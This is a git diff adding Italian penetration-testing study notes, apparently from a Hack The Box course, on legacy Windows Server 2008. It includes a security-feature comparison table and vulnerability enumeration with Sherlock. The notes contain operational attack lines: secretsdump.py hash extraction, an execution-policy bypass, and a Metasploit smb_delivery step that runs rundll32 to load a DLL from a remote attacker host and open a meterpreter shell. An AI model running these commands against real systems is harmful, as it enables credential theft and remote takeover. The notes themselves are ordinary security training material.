@@ -1572,3 +1572,48 @@ Su windows si puo' usare **Disk Management** > actions >
 
 ### Retrievare hash con secretsdump.py
 `j4k1dibe@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL`
+
+
+# Windows Server
+
+Windows server 2008/2008 R2 nel 14 gennaio 2020 sono arrivati all EOL.
+
+Non e' piu' comune incontrare Win Server 2008 pero' negli assesment esterni ma negi assesment interi spesso si incontra.
+
+## Windows server 2008 vs newer versions
+
+| Feature                                | Server 2008 R2 | Server 2012 R2 | Server 2016 | Server 2019 |
+|----------------------------------------|----------------|----------------|-------------|-------------|
+| Enhanced Windows Defender Advanced Threat Protection (ATP) |                |                |             | X           |
+| Just Enough Administration             | Partial        | Partial        | X           | X           |
+| Credential Guard                       |                |                | X           | X           |
+| Remote Credential Guard                |                |                | X           | X           |
+| Device Guard (code integrity)          |                |                | X           | X           |
+| AppLocker                               | Partial        | X              | X           | X           |
+| Windows Defender                        | Partial        | Partial        | X           | X           |
+| Control Flow Guard                      |                |                | X           | X           |
+
+
+Spesso quando si ha a che fare con legacy system e' molto importante capirre se sono fondamentali per il cliente.
+
+Su sistemi legacy come windows server 2008 possono usare script di enumerazione come **sherlock** https://github.com/rasta-mouse/Sherlock, o **Windows-Exploit-Suggester** (https://github.com/AonCyberLabs/Windows-Exploit-Suggester).
+
+
+### Querying current Patch level
+`C:\htb> wmic qfe`
+
+## Running Sherlock
+`PS C:\htb> Set-ExecutionPolicy bypass -Scope process`
+
+```
+PS C:\htb> Import-Module .\Sherlock.ps1
+PS C:\htb> Find-AllVulns
+```
+
+
+## Prendere una meterpreter shell
+
+1) usiamo exploit di metasploit **smb_delivery**
+2) nella NOSTRA shell: `C:\htb> rundll32.exe \\10.10.14.3\lEUZam\test.dll`
+3) Spesso per runnare moduli di privesc(tipo msf6 exploit(windows/smb/smb_delivery) > search 2010-3338) dobbiamo **MIGRARE AD UN PROCESSO A 64bite**
+`
